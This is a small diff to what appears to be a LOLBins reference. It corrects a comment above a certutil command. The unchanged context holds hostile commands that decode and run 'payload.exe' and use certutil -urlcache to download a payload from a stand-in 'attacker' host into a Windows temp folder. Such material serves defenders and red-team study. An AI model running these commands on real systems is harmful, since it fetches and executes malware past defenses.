@@ -73,7 +73,7 @@ Living Off the Land Binaries and Scripts (LOLBins/LOLBAs) are Microsoft-signed e
 :: Execute encoded payload
 certutil -decode encoded.b64 payload.exe && payload.exe
 
-:: Decode base64 inline
+:: Download file from URL to disk
 certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\p.exe
 
 :: Alternative: use certutil to decode a locally staged file
